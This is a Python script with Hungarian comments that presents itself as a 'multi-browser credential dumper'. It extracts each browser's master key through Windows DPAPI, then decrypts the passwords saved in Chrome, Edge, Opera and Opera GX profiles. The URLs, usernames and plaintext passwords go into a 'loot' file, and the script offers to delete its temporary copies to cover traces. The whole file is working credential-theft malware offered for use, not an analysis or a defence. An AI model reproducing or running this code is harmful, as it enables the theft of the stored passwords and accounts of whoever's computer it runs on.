import os
import json
import base64
import sqlite3
import shutil
import win32crypt 
from Crypto.Cipher import AES 
from datetime import datetime

# --- KONFIGURÁCIÓ: A CÉLPONTOK LISTÁJA ---
# Itt adjuk meg, hol laknak a böngészők adatbázisai
BROWSERS = {
    "Google Chrome": {
        "path": os.path.join(os.environ["LocalAppData"], "Google", "Chrome", "User Data"),
        "local_state": "Local State"
    },
    "Microsoft Edge": {
        "path": os.path.join(os.environ["LocalAppData"], "Microsoft", "Edge", "User Data"),
        "local_state": "Local State"
    },
    "Opera Stable": {
        "path": os.path.join(os.environ["AppData"], "Opera Software", "Opera Stable"),
        "local_state": "Local State"
    },
    "Opera GX": {
        "path": os.path.join(os.environ["AppData"], "Opera Software", "Opera GX Stable"),
        "local_state": "Local State"
    }
}

def get_master_key(browser_path, local_state_file):
    """Megszerzi a titkosító kulcsot az adott böngészőhöz."""
    local_state_path = os.path.join(browser_path, local_state_file)
    
    if not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:] # 'DPAPI' levágása
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"[-] Hiba a kulcs megszerzésekor ({browser_path}): {e}")
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode()
    except:
        return "HIBA (Nem visszafejthető)"

def get_login_data_paths(browser_path):
    """Megkeresi a 'Default' és 'Profile X' mappákat."""
    paths = []
    if os.path.exists(browser_path):
        # Opera esetében a fájl közvetlenül a gyökérben van, nem Default mappában!
        if "Opera" in browser_path:
            login_db = os.path.join(browser_path, "Login Data")
            if os.path.exists(login_db):
                paths.append(("Default Profile", login_db))
        else:
            # Chrome / Edge struktúra
            for item in os.listdir(browser_path):
                if item == "Default" or item.startswith("Profile"):
                    full_path = os.path.join(browser_path, item, "Login Data")
                    if os.path.exists(full_path):
                        paths.append((item, full_path))
    return paths

def main():
    os.system("cls")
    print("==========================================")
    print("   🕵️‍♂️  MULTI-BROWSER CREDENTIAL DUMPER   ")
    print("      Chrome | Edge | Opera | GX          ")
    print("==========================================\n")

    loot_file = "megszerzett_jelszavak.txt"
    found_any = False
    temp_files = [] # Eltároljuk a másolatok nevét a későbbi törléshez

    with open(loot_file, "w", encoding="utf-8") as f_out:
        f_out.write(f"Zsákmányolás ideje: {datetime.now()}\n")
        f_out.write("==========================================\n\n")

        # --- FŐ CIKLUS: Végigmegyünk az összes böngészőn ---
        for browser_name, config in BROWSERS.items():
            print(f"[*] Keresés: {browser_name}...")
            
            master_key = get_master_key(config["path"], config["local_state"])
            if not master_key:
                print(f"    [-] Nincs telepítve vagy nem található kulcs.")
                continue

            profiles = get_login_data_paths(config["path"])
            if not profiles:
                print(f"    [-] Üres vagy nem használt profilok.")
                continue

            for profile_name, db_path in profiles:
                # Másolat készítése
                temp_db = f"Temp_{browser_name.replace(' ', '_')}_{profile_name}.db"
                shutil.copyfile(db_path, temp_db)
                temp_files.append(temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cursor.fetchall()
                    
                    count = 0
                    if len(rows) > 0:
                        print(f"    [+] {profile_name}: {len(rows)} db bejegyzés található.")
                        f_out.write(f"--- {browser_name} ({profile_name}) ---\n")

                        for row in rows:
                            url = row[0]
                            username = row[1]
                            encrypted_pass = row[2]
                            
                            if username and encrypted_pass:
                                decrypted = decrypt_password(encrypted_pass, master_key)
                                if len(decrypted) > 0:
                                    # KIÍRÁS A KÉPERNYŐRE (Szépen formázva)
                                    print(f"        🔑 {url} | {username} | {decrypted}")
                                    
                                    # FÁJLBA ÍRÁS
                                    f_out.write(f"URL: {url}\nUser: {username}\nPass: {decrypted}\n{'-'*30}\n")
                                    count += 1
                                    found_any = True
                    
                    if count == 0:
                        print(f"    [.] {profile_name}: Nincsenek mentett jelszavak.")

                except Exception as e:
                    print(f"    [!] Adatbázis hiba: {e}")
                
                cursor.close()
                conn.close()
                print("") # Üres sor elválasztónak

    # --- ÖSSZEGZÉS ÉS TAKARÍTÁS ---
    print("\n==========================================")
    if found_any:
        print(f"[✅] SIKER! A jelszavakat elmentettem ide: {loot_file}")
        print("Nyisd meg a fájlt a mappában a teljes listáért!")
    else:
        print("[❌] Nem találtam egyetlen visszafejthető jelszót sem.")
    
    print("==========================================")
    
    # Interaktív törlés
    choice = input("\n[?] Akarod törölni a nyomokat (ideiglenes adatbázis másolatok)? (i/n): ").lower()
    
    if choice == 'i' or choice == 'y':
        print("[*] Takarítás folyamatban...")
        for temp_file in temp_files:
            try:
                os.remove(temp_file)
            except: pass
        print("[+] Tiszta a terep. Viszlát!")
    else:
        print("[!] FIGYELEM: Az ideiglenes .db fájlok ott maradtak a mappában!")

if __name__ == "__main__":
    main()